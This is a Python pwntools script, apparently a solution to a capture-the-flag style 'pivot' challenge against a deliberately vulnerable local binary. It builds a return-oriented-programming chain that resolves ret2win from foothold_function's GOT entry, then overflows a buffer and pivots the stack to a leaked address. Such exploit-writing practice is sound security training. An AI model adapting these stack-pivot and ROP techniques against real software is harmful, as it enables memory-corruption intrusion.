#!/bin/python3

from pwn import *

elf = ELF("./pivot")
p = process(elf.path)

'''
pid = util.proc.pidof(p)[0]
print("The pid is " + str(pid))
util.proc.wait_for_debugger(pid)
'''

foothold_plt = p64(elf.symbols.plt['foothold_function'])
foothold_got = p64(elf.symbols.got['foothold_function'])
ret2win_offset = 0x117

#Gadgets
pop_rax = p64(0x004009bb)
pop_rbp = p64(0x00400829)
xchg_rax_rsp = p64(0x004009bd)
mov_rax_prt_rax = p64(0x004009c0)
add_rax_rbp = p64(0x004009c4)
call_rax_add_rsp_8 = p64(0x004006b0)

p.recvuntil("The Old Gods kindly bestow upon you a place to pivot:")
pivot_address = p64(int(p.recvline(), 16)) # Get address to pivot

# First input (ROP)
p.recvuntil(">")
payload = b""
payload += foothold_plt

payload += pop_rax
payload += foothold_got
payload += mov_rax_prt_rax

payload += pop_rbp
payload += p64(ret2win_offset)
payload += add_rax_rbp
payload += call_rax_add_rsp_8

p.sendline(payload)

# Second input (PIVOT)
p.recvuntil(">")
payload = b""
payload += b"A" * 40 # Padding

payload += pop_rax
payload += pivot_address
payload += xchg_rax_rsp

p.sendline(payload)

print(p.recvall())

